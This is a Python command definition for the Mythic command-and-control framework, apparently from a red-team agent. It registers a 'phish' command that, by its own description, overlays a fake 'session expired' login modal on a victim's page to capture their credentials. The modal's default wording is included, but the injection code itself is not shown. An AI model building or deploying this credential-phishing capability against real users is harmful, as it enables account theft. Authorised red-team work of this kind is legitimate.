from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class PhishArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="title",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="Session Expired",
                description="Modal title text",
            ),
            CommandParameter(
                name="subtitle",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="Your session has timed out. Please sign in again to continue.",
                description="Modal subtitle/description text",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class PhishCommand(CommandBase):
    cmd = "phish"
    needs_admin = False
    help_cmd = "phish"
    description = "Inject a fake 'session expired' login modal over the page. Captures credentials when the victim submits the form. Customizable title and subtitle."
    version = 1
    author = "@grampae"
    attackmapping = ["T1056.002"]
    argument_class = PhishArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.MacOS, SupportedOS.Linux, SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        title = task.args.get_arg("title") or "Session Expired"
        task.display_params = '"{}"'.format(title)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
